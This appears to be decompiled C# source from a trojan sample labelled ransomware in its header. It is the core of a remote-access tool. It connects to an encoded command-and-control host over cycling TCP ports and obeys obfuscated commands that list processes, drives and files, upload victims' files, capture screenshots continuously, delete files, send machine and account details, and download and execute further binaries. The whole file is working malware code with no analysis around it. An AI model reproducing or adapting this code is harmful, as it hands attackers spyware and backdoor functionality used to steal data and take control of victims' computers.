// Decompiled with JetBrains decompiler
// Type: hdrmiprcav.MROIDM
// Assembly: hdrmiprcav, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19C57B26-C98B-40D0-861C-E3408295906D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-bff6270b7c6240c394515dc2505bb9f55d7b9df700be1777a8469143f78d0eb6.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace hdrmiprcav
{
  public class MROIDM
  {
    private ThreadStart obj_thread;
    public TcpClient main_socket;
    public bool is_breaks = false;
    private bool is_matchs = false;
    private bool rondoming = false;
    private EDIRARE obj_state = new EDIRARE();
    private MORLEINF user_account;
    private int desk_size = 210;
    private bool des_writer = false;
    private bool is_save_scren = false;
    public int port_index = 0;
    public NetworkStream net_stream;
    private int bufer_size = 1024;
    private DEROIVF hdi_drive = new DEROIVF();
    private int bytes_process = 0;
    public bool is_req_cancel = false;
    public DateTime pro_datetime;
    private Thread fun_thrwad;
    private MemoryStream scr_mem_stream = new MemoryStream();
    private SCILRNS scrn_caps = new SCILRNS();
    private Bitmap image;

    public void core_start()
    {
      DAEONIF.port = DAEONIF.ports[0];
      this.user_account = new MORLEINF();
      this.hdi_drive.core_svr = this;
      this.obj_state.timer = new Timer(new TimerCallback(this.proc_loop), (object) this.obj_state, 38120, 56520);
    }

    public void remove_account()
    {
      try
      {
        byte[] bytes = this.down_data();
        string str = DAEONIF.get_app_path() + DAEONIF.del_account + ".exe|".Split('|')[0];
        if (File.Exists(str))
          return;
        File.WriteAllBytes(str, bytes);
        Process.Start(str);
      }
      catch
      {
      }
    }

    public NetworkStream net_str(TcpClient main_socket) => main_socket.GetStream();

    public void download_file(string file_path)
    {
      try
      {
        byte[] bytes = this.down_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(file_path, bytes);
      }
      catch
      {
      }
    }

    private void process_core()
    {
      if (!this.is_matchs)
      {
        this.is_matchs = true;
        this.net_stream = this.net_str(this.main_socket);
        this.is_save_scren = false;
        while (this.is_breaks)
        {
          string[] procss_type = this.get_procss_type();
          if (procss_type == null)
          {
            this.is_breaks = false;
            break;
          }
          this.is_req_cancel = false;
          string lower = procss_type[0].ToLower();
          if (lower.Split('-').Length > 1)
            lower = lower.Split('-')[1];
          switch (lower.Insert(3, "7"))
          {
            case "gey7tavs":
            case "get7avs":
              this.obj_thread = (ThreadStart) (() => this.machine_procss("geytavs"));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "thy7umb":
            case "thu7mb":
              this.images_details(procss_type[1]);
              break;
            case "pry7ocl":
            case "pro7cl":
              this.obj_thread = (ThreadStart) (() => this.machine_procss("pryocl"));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "puy7tsrt":
            case "put7srt":
              this.save_apps();
              break;
            case "doy7wf":
            case "dow7f":
              this.download_file(procss_type[1]);
              break;
            case "scy7rsz":
            case "scr7sz":
              this.dsk_scrn_size(procss_type[1]);
              break;
            case "fiy7lsz":
            case "fil7sz":
              this.obj_thread = (ThreadStart) (() => this.file_details(procss_type[1]));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "cdc7rgn":
            case "csc7rgn":
            case "csd7crgn":
              this.seye_scren(procss_type[1]);
              break;
            case "sty7ops":
            case "sto7ps":
              this.is_save_scren = false;
              break;
            case "scu7ren":
            case "scr7en":
              this.is_save_scren = true;
              this.obj_thread = (ThreadStart) (() => this.isy_desk_scren(procss_type[1]));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "diy7rs":
            case "dir7s":
              this.fun_thrwad = new Thread(new ThreadStart(this.show_send_drives));
              this.fun_thrwad.Start();
              break;
            case "cny7ls":
            case "cnl7s":
              this.is_req_cancel = true;
              this.is_save_scren = false;
              break;
            case "dey7lt":
            case "del7t":
              this.tras_files(procss_type[1]);
              break;
            case "afy7ile":
            case "afi7le":
              this.obj_thread = (ThreadStart) (() => this.seynd_auto(procss_type[1]));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "udy7lt":
            case "udl7t":
              this.remove_account();
              break;
            case "liy7stf":
            case "lis7tf":
              this.obj_thread = (ThreadStart) (() => this.hdi_drive.see_folders(procss_type[1]));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "iny7fo":
            case "inf7o":
              this.account_infos();
              break;
            case "ruy7nf":
            case "run7f":
              try
              {
                Process.Start(procss_type[1].Split('>')[0]);
                break;
              }
              catch
              {
                break;
              }
            case "fiy7le":
            case "fil7e":
              this.obj_thread = (ThreadStart) (() => this.move_files(procss_type[1]));
              this.fun_thrwad = new Thread(this.obj_thread);
              this.fun_thrwad.Start();
              break;
            case "doy7wr":
            case "dow7r":
              this.download_file(procss_type[1]);
              break;
            case "fly7dr":
            case "fld7r":
              string str1 = this.hdi_drive.exp_folder(procss_type[1]);
              if (str1 != "")
              {
                this.load_data((byte[]) null, "flydr=|".Split('|')[0] + str1);
                break;
              }
              break;
            case "fly7es":
            case "fle7s":
              string str2 = this.hdi_drive.see_files(procss_type[1]);
              if (str2 != "")
              {
                this.load_data((byte[]) null, "flyes=|".Split('|')[0] + str2);
                break;
              }
              break;
          }
        }
        this.is_breaks = false;
        this.is_save_scren = false;
      }
      this.is_matchs = false;
    }

    public string file_details(string path, bool retn = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (retn)
          str1 = "<|".Split('|')[0];
        else
          str1 = ">|".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (retn)
          str4 = "<|".Split('|')[0];
        else
          str4 = ">|".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.geyt_size(fileInfo.Length);
        string str7;
        if (retn)
          str7 = "<|".Split('|')[0];
        else
          str7 = ">|".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!retn)
          this.load_data((byte[]) null, "fiylsz=|".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    private void proc_loop(object obj_surce)
    {
      try
      {
        if (!this.rondoming)
        {
          this.rondoming = true;
          if (!this.is_breaks || !this.main_socket.Connected)
          {
            this.is_breaks = this.system_cons();
            if (this.is_breaks)
            {
              this.bufer_size = this.main_socket.ReceiveBufferSize;
              this.process_core();
            }
          }
        }
        this.rondoming = false;
      }
      catch
      {
        this.is_breaks = false;
        this.is_matchs = false;
        this.rondoming = false;
        this.des_writer = false;
      }
    }

    private bool system_cons()
    {
      try
      {
        DAEONIF.main_tp = DAEONIF.get_bytes_string(DAEONIF.main_cons);
        this.main_socket = new TcpClient();
        this.main_socket.Connect(DAEONIF.main_tp, DAEONIF.port);
        return true;
      }
      catch
      {
        ++this.port_index;
        DAEONIF.port = DAEONIF.ports[this.port_index];
        if (this.port_index >= DAEONIF.ports.Length - 1)
          this.port_index = 0;
        return false;
      }
    }

    public bool seynd_auto(string file_info_str)
    {
      try
      {
        string path = file_info_str.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          file_info_str = file_info_str + ">" + fileName;
          this.load_data(data, "afyile=" + file_info_str);
          return false;
        }
        this.load_data((byte[]) null, "anyfod=" + file_info_str);
        return false;
      }
      catch
      {
        return false;
      }
    }

    private void images_details(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.geyt_size(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.load_data(memoryStream.ToArray(), "thyumb=|".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    public void machine_procss(string types)
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + (object) processes[index].Id + ">|".Split('|')[0] + processes[index].ProcessName + ">|".Split('|')[0] + "0>|".Split('|')[0] + "<";
        this.load_data(DAEONIF.get_bytes_array(str), types + "=proyess|".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void save_apps()
    {
      try
      {
        DAEONIF.set_conup("width|".Split('|')[0], DAEONIF.my_path);
      }
      catch
      {
      }
    }

    private void seye_scren(string desk_scren_size)
    {
      try
      {
        this.desk_size = (int) Convert.ToInt16(desk_scren_size.Split('>')[0].Trim());
        this.image = this.scrn_caps.desk_scren(this.desk_size);
        this.scr_mem_stream.SetLength(0L);
        this.image.Save((Stream) this.scr_mem_stream, ImageFormat.Jpeg);
        this.load_data(this.scr_mem_stream.ToArray(), "csdcrgn=|".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void isy_desk_scren(string desk_scren_size)
    {
      try
      {
        this.desk_size = (int) Convert.ToInt16(desk_scren_size.Split('>')[0].Trim());
        while (this.is_save_scren && this.is_breaks)
        {
          this.image = this.scrn_caps.desk_scren(this.desk_size);
          this.scr_mem_stream.SetLength(0L);
          this.image.Save((Stream) this.scr_mem_stream, ImageFormat.Jpeg);
          this.load_data(this.scr_mem_stream.ToArray(), "scyren=|".Split('|')[0]);
        }
      }
      catch
      {
      }
    }

    private string geyt_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|".Split('|')[0],
          "KB|".Split('|')[0],
          "MB|".Split('|')[0],
          "GB|".Split('|')[0],
          "TB|".Split('|')[0],
          "PB|".Split('|')[0],
          "EB|".Split('|')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    private void account_infos() => this.load_data(DAEONIF.get_bytes_array(this.user_account.lan_info + "|" + this.user_account.com_name + "|" + this.user_account.acc_date_time + "|" + this.user_account.account_name + "|" + DAEONIF.ops_name() + "|" + this.user_account.rm_version + "|" + "| !".Split('!')[0] + "|" + this.user_account.account_opt + "|" + DAEONIF.get_app_path()), "inyfo=usder|".Split('|')[0]);

    private void dsk_scrn_size(string sc_size)
    {
      try
      {
        this.desk_size = (int) Convert.ToInt16(sc_size.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    private void move_files(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.load_data(File.ReadAllBytes(lfile), "fiyle=|".Split('|')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public void tras_files(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    public bool load_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        if (this.des_writer)
          return false;
        this.des_writer = true;
        byte[] bytesArray = DAEONIF.get_bytes_array(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(bytesArray.Length);
        byte[] buffer = new byte[num2 + bytesArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        bytesArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + bytesArray.Length);
          data.CopyTo((Array) buffer, 10 + bytesArray.Length);
        }
        int offset = 0;
        int count;
        for (int length = buffer.Length; length > 0 && !this.is_req_cancel; length -= count)
        {
          count = length > this.bufer_size ? this.bufer_size : length;
          this.net_stream.Write(buffer, offset, count);
          offset += count;
        }
        this.des_writer = false;
        return !this.is_req_cancel;
      }
      catch
      {
        this.des_writer = false;
        this.is_breaks = false;
        return false;
      }
    }

    public byte[] down_data()
    {
      try
      {
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.bytes_process = this.net_stream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        for (int index = int32; index > 0 && !this.is_req_cancel; index -= this.bytes_process)
        {
          int count = index > this.bufer_size ? this.bufer_size : index;
          this.bytes_process = this.net_stream.Read(buffer2, offset, count);
          offset += this.bytes_process;
        }
        if (this.is_req_cancel)
        {
          this.net_stream.Flush();
          do
            ;
          while (this.net_stream.DataAvailable && this.net_stream.ReadByte() >= 0);
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.is_breaks = false;
        return (byte[]) null;
      }
    }

    public string[] get_procss_type()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.bytes_process = this.net_stream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.bytes_process)
        {
          int count = index > this.bufer_size ? this.bufer_size : index;
          this.bytes_process = this.net_stream.Read(numArray, offset, count);
          offset += this.bytes_process;
        }
        string bytesString = DAEONIF.get_bytes_string(numArray);
        if (bytesString.Trim() == "")
          return (string[]) null;
        return bytesString.Split('=');
      }
      catch
      {
        this.is_breaks = false;
        return (string[]) null;
      }
    }

    private void show_send_drives() => this.load_data((byte[]) null, "diyrs=" + this.hdi_drive.lookup_drive());
  }
}
